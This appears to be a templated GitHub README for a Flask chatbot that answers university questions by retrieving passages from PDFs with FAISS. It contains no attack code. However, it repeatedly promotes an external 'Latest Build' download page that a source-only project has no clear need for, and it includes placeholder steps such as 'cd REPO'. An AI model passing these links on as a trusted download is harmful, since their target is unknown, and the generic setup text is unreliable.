# AITS University RAG Chatbot - AI University Chatbot 2026

> **AITS University RAG Chatbot is a Flask-powered web application that uses semantic search, FAISS retrieval, and an LLM to answer questions using information stored in a PDF knowledge base.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/ryan-stonevx2158/aits-pdf-rag-chatbot?style=flat-square)](https://github.com/ryan-stonevx2158/aits-pdf-rag-chatbot)

---

<p align="center">
  <a href="https://ryan-stonevx2158.github.io/aits-pdf-rag-chatbot/">
    <img src="https://img.shields.io/badge/Download-AITS%20University%20RAG%20Chatbot%20Latest-brightgreen?style=for-the-badge" alt="Download AITS University RAG Chatbot">
  </a>
</p>

> **[Download AITS University RAG Chatbot](https://ryan-stonevx2158.github.io/aits-pdf-rag-chatbot/)**

---

[Download Latest Build](https://ryan-stonevx2158.github.io/aits-pdf-rag-chatbot/)

---

## Overview

AITS University RAG Chatbot gives students, staff, and visitors a conversational way to look up frequently needed university information. Through retrieval-augmented generation, the application first finds useful passages in a PDF-based knowledge source and then creates a response informed by that material.

The system pairs vector embeddings and semantic search with FAISS-based document retrieval. Its Flask interface makes those university FAQs and reference documents available through a browser chat experience.

---

## What It Provides

- Answers AI-generated questions about the university
- Finds relevant content through embedding-based semantic search
- Reads information from a PDF knowledge base
- Builds replies using context retrieved from the source documents
- Uses FAISS to accelerate document searching
- Offers an interactive chat page in a web browser
- Supports university FAQ-style question-and-answer workflows
- Provides a Flask application foundation for the web interface

---

## Getting Started

First, download the repository and enter its directory:

```bash
git clone https://github.com/ryan-stonevx2158/aits-pdf-rag-chatbot.git
cd REPO
```

Set up an isolated Python environment:

```bash
python -m venv .venv
```

Activate it on macOS or Linux:

```bash
source .venv/bin/activate
```

For Windows PowerShell, use:

```powershell
.venv\Scripts\Activate.ps1
```

When the repository provides a dependency file, install its packages with:

```bash
pip install -r requirements.txt
```

Place the PDF reference content in the appropriate location and configure any model or service values required by the application. Start Flask through the project's entry point; for example:

```bash
python app.py
```

Then visit the local URL printed by Flask.

---

## Using the Chatbot

1. Launch the Flask server.
2. Navigate to the chatbot's local page.
3. Ask a question related to AITS or another subject included in the PDF knowledge base.
4. Send the question from the browser chat interface.
5. Read the answer generated with support from the retrieved document context.
6. When the reference PDFs change, replace them and rebuild or refresh the searchable index as required by the project.

Possible prompts include:

- `What information is available about university FAQs?`
- `Where can I find details covered in the knowledge base?`
- `What does the uploaded university documentation say about this topic?`

---

## Settings

Store application-specific values in the repository's supported configuration or environment files. An example environment configuration is:

```env
FLASK_ENV=development
KNOWLEDGE_BASE_PATH=./data
FAISS_INDEX_PATH=./index
```

The exact variable names must match those used by the application. Keep credentials, model configuration, and other deployment-only values out of committed code.

Ensure that both the PDF knowledge-base location and the FAISS index path can be accessed by the Flask process.

---

## Prerequisites

- A modern web browser
- A Python runtime compatible with the Flask application
- Flask
- Packages needed for embeddings, semantic search, and LLM connectivity
- FAISS for vector document retrieval
- PDF documents containing university reference information
- Enough local disk space for PDFs, embeddings, and the FAISS index
- Network connectivity when the chosen LLM or related service runs remotely

---

## Common Questions

### Who can use this chatbot?

The chatbot is aimed at anyone looking for university information represented in the connected PDF files. This includes students, staff, and visitors.

### What happens when a question is submitted?

Semantic similarity is used to search the indexed material. FAISS retrieves relevant document context, which is then supplied to the generation process to help form the answer.

### Where do the PDF documents belong?

Place them in the knowledge-base directory selected by the project configuration. If no location has been customized, inspect the repository layout and application settings to find the expected PDF directory.

### How can the source information be updated?

Add or replace the applicable PDF files, then regenerate the embeddings and FAISS index through the indexing process provided by the project.

### What should I do if the site will not load?

Check the terminal for Flask startup errors, verify that the required packages are installed, and make sure the browser is using the host and port reported by Flask.

### How can I find newer versions?

Look in the repository for later commits, releases, or updated downloadable builds.

### Where should environment values and credentials go?

Use the configuration files or environment variables supported by the project. Sensitive service credentials should not be hard-coded in source files.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
